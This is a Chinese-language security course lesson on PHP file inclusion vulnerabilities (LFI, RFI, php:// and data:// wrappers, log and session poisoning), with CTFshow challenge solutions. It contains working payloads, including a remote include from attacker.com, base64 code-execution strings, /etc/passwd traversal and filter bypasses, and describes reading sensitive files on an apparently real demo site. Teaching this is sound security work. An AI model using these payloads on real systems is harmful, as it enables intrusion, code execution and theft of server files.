![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_1.png)

# 🗂️ 课程P50：PHP文件包含漏洞详解（LFI/RFI/伪协议/无文件利用）

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_3.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_5.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_7.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_9.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_11.png)

在本节课中，我们将要学习PHP中的文件包含漏洞。我们将从漏洞的本质出发，理解其产生原因，并详细探讨在黑白盒测试环境下的多种利用方法，包括本地文件包含（LFI）、远程文件包含（RFI）、伪协议利用以及无文件利用技术。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_13.png)

## 什么是文件包含漏洞？

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_15.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_17.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_19.png)

文件包含是程序开发中为了代码复用而引入的一种机制。开发者可以将公共代码（如函数、配置）写入独立文件，在需要时通过包含函数引入，从而避免重复编写。在PHP中，常见的包含函数有 `include`、`require`、`include_once`、`require_once`。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_21.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_23.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_25.png)

文件包含漏洞的产生，源于开发者将包含的文件路径设置为用户可控的变量。攻击者通过控制这个变量，可以包含并执行任意文件，从而导致安全风险。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_27.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_29.png)

**漏洞产生的核心条件：**
1.  使用了文件包含函数。
2.  包含的文件路径是用户可控的变量。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_31.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_33.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_35.png)

一个简单的漏洞示例代码如下：
```php
<?php
    $file = $_GET[‘file‘];
    include($file);
?>
```
当访问 `?file=恶意文件路径` 时，即可触发漏洞。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_37.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_39.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_41.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_42.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_44.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_46.png)

## 文件包含的分类：LFI与RFI

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_48.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_50.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_52.png)

文件包含主要分为两类：本地文件包含（LFI）和远程文件包含（RFI）。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_54.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_56.png)

*   **本地文件包含（LFI）**：只能包含服务器本地的文件。
*   **远程文件包含（RFI）**：可以包含远程服务器上的文件（通过HTTP/FTP等协议）。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_58.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_59.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_61.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_63.png)

两者的差异主要由两个因素决定：
1.  **代码层面的过滤**：例如，过滤了 `http://` 等协议字符串。
2.  **PHP配置开关**：`allow_url_include` 选项。该选项在高版本PHP中默认关闭，因此RFI在实际中已较为少见。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_65.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_67.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_69.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_71.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_73.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_75.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_77.png)

远程包含的利用方式简单直接，即包含一个由攻击者控制的远程文件，该文件中包含恶意代码。例如：
```
?file=http://attacker.com/shell.txt
```

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_79.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_81.png)

## 文件包含漏洞的危害与利用思路

文件包含漏洞的核心危害在于**可导致任意代码执行**。根据是否能够上传文件，本地文件包含（LFI）的利用分为“有文件利用”和“无文件利用”。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_83.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_85.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_87.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_89.png)

上一节我们介绍了文件包含的基本概念与分类，本节中我们来看看其具体的危害与利用思路。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_91.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_93.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_95.png)

### 有文件利用

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_97.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_99.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_101.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_103.png)

这种方式通常需要配合**文件上传漏洞**。攻击者先上传一个包含恶意代码的文件（如图片马），然后通过文件包含漏洞去包含这个上传的文件，从而执行其中的代码。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_105.png)

### 无文件利用

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_107.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_109.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_111.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_112.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_114.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_116.png)

当无法上传文件时，则需要借助服务器上已有的文件或PHP内置特性来实现攻击。主要有以下三种方式：

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_118.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_120.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_122.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_124.png)

1.  **包含日志文件**：Web服务器（如Apache、Nginx）的访问日志会记录请求信息。攻击者可以将恶意代码写入User-Agent或Referer等字段，然后让存在漏洞的程序去包含日志文件，从而执行代码。
2.  **包含Session文件**：PHP的Session机制会将用户数据存储在服务器临时文件中。如果攻击者能控制Session内容（例如通过表单提交），并知道Session文件的存储路径和命名规则，就可以尝试包含该文件以执行代码。
3.  **利用伪协议**：PHP提供了一系列封装协议（伪协议），可以用于文件包含场景，实现文件读取、代码执行等操作，这是CTF比赛和实战中非常常见的技巧。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_126.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_128.png)

## 🔧 PHP伪协议详解与利用

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_130.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_132.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_134.png)

伪协议是PHP中用于访问各种输入/输出流的封装协议。在文件包含漏洞的利用中，它们扮演着至关重要的角色。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_136.png)

以下是几种核心伪协议的利用方式：

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_138.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_140.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_141.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_143.png)

### 1. 利用伪协议读取文件

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_145.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_147.png)

*   **`file://` 协议**：用于访问本地文件系统。需要知道文件的绝对路径。
    ```
    ?file=file:///etc/passwd
    ```
*   **`php://filter` 协议**：用于读取文件源码并进行过滤转换，常用于读取源代码。它不需要绝对路径，且可以绕过一些后缀限制。
    ```
    ?file=php://filter/read=convert.base64-encode/resource=index.php
    ```
    上述Payload会以Base64编码的形式读取 `index.php` 的源代码，解码后即可获得明文。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_149.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_151.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_153.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_155.png)

### 2. 利用伪协议执行代码

*   **`php://input` 协议**：可以访问请求的原始数据。需要 `allow_url_include` 开启，并且以 **POST** 方式提交要执行的PHP代码。
    ```
    POST /vul.php?file=php://input HTTP/1.1
    ...
    <?php system(‘ls‘); ?>
    ```
*   **`data://` 协议**：同样需要 `allow_url_include` 开启。可以直接在URL中执行Base64编码的代码。
    ```
    ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOyA/Pg==
    ```
    其中 `PD9waHAgc3lzdGVtKCJscyIpOyA/Pg==` 是 `<?php system(“ls“); ?>` 的Base64编码。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_157.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_159.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_161.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_163.png)

### 3. 利用伪协议写入文件

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_165.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_167.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_169.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_171.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_173.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_175.png)

通过 `php://filter` 与 `php://input` 协议结合写入操作，可以向服务器写入文件。这通常需要代码中有相应的文件写入逻辑配合，在CTF中较为常见。
例如，利用 `php://input` 接收POST数据并写入文件：
```php
<?php file_put_contents($_GET[‘file‘], file_get_contents(‘php://input‘)); ?>
```
攻击者可以提交：`?file=shell.php` 并在POST Body中写入恶意代码。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_177.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_179.png)

**伪协议利用条件总结：**
*   `allow_url_fopen` 和 `allow_url_include` 的开关状态会影响 `php://input` 和 `data://` 协议的使用。
*   `php://filter` 协议的限制较少，是最常用的读取文件协议。
*   不同PHP版本对协议的支持略有差异。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_181.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_183.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_185.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_187.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_189.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_191.png)

## 🎯 实战与CTF题型分析

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_193.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_195.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_197.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_199.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_201.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_203.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_205.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_207.png)

理解了原理后，我们通过实例来加深理解。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_209.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_211.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_213.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_215.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_217.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_219.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_221.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_222.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_224.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_225.png)

### 黑盒实战案例

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_226.png)

在一个真实的WPS演示站点中，发现URL参数存在文件包含漏洞：
```
/show.image.php?file=example.jpg
```
通过将 `file` 参数修改为 `../../../../etc/passwd` 或 `database.config.php`，成功读取了服务器上的敏感文件内容。在实际攻击中，后续会尝试使用伪协议进行代码执行，但该演示站点已对此做了防护。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_228.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_230.png)

### CTF题型通关思路（以CTFshow平台为例）

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_232.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_234.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_236.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_238.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_240.png)

以下是文件包含相关题型的常见解题思路：

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_242.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_244.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_246.png)

**Web 78（基础包含）**
*   **考点**：基础文件包含，无过滤。
*   **解法**：直接使用 `php://filter` 读取 `flag.php`。
    ```
    ?file=php://filter/read=convert.base64-encode/resource=flag.php
    ```

**Web 79（过滤`php`）**
*   **考点**：将 `php` 字符串替换为空。
*   **解法**：使用 `data://` 协议，并将代码进行Base64编码绕过。
    ```
    ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8+
    ```

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_248.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_250.png)

**Web 80-81（过滤协议关键字与日志包含）**
*   **考点**：过滤了 `php`、`data`、`file` 等协议关键字。
*   **解法**：采用**日志文件包含**。
    1.  利用BurpSuite等工具，在访问网站时，将恶意代码（如 `<?php system(“ls“);?>`）写入 `User-Agent` 头。
    2.  包含Web服务器的访问日志文件（默认路径如 `/var/log/apache2/access.log`）。
    3.  日志文件被包含时，其中的恶意代码会被执行。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_252.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_254.png)

**Web 82-86（Session文件包含）**
*   **考点**：过滤了所有协议关键字和特殊符号，无法使用伪协议。
*   **解法**：采用**Session文件包含**，并配合条件竞争。
    1.  PHP的Session文件默认存储在 `/tmp/sess_[sessionid]`。
    2.  通过表单提交等方式，将恶意代码写入 `$_SESSION` 变量。
    3.  利用文件包含漏洞，不断尝试包含这个Session文件。
    4.  由于Session文件可能被清空，需要利用条件竞争（多线程同时进行写入和包含），在文件被清空前成功执行代码。

**Web 87（Base64编码过滤）**
*   **考点**：过滤了Base64编码中的 `=` 和 `+` 等字符。
*   **解法**：生成不含这些特殊字符的Base64载荷。可以通过在原始代码前添加无关字符（如多个`a`）并重新编码，直到生成的Base64字符串不包含被过滤的字符为止。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_256.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_257.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_258.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_260.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_262.png)

**Web 88（过滤`php://`）**
*   **考点**：过滤了 `php://`，但可以使用 `php://filter` 的变种或编码绕过。
*   **解法**：对 `php://` 进行二次URL编码，或使用 `PHP://filter`（大小写绕过）。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_264.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_266.png)

**Web 89（综合过滤）**
*   **考点**：综合过滤了多种协议和编码关键字。
*   **解法**：尝试使用未被过滤的伪协议，如 `phar://`（需服务器支持），或利用字符串转换过滤器（如 `convert.iconv.*`）进行复杂的编码转换以绕过检测。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_268.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_270.png)

## 📝 总结

本节课中我们一起学习了PHP文件包含漏洞的完整知识体系：

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_272.png)

1.  **漏洞原理**：源于用户可控的包含文件路径变量。
2.  **漏洞分类**：区分了本地文件包含（LFI）和远程文件包含（RFI）。
3.  **利用思路**：分为有文件利用（配合上传）和无文件利用（日志、Session、伪协议）。
4.  **伪协议核心**：详细讲解了 `file://`、`php://filter`、`php://input`、`data://` 等协议在文件读取、代码执行、文件写入方面的应用。
5.  **实战应用**：分析了黑盒测试中的发现思路，并系统性地拆解了CTF中各类文件包含题型的绕过技巧与解法。

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_274.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_276.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_278.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_280.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_282.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_284.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_286.png)

![](img/5c6bfa81bd63a1b89c54dcadfb1a836a_288.png)

文件包含是Web安全中一个经典且危害巨大的漏洞，理解其原理和多种利用方式，对于安全测试和代码审计都至关重要。